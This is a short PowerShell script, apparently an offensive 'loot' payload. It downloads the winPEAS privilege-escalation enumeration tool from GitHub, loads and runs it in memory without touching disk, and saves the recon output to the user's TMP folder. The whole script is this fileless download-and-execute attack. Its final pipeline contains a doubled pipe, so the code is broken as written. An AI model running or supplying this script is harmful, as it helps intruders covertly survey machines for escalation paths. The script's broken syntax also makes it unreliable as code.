# MAKE LOOT FOLDER
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"

# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") | | Out-File -Encoding ASCII $env:TMP\$FileName


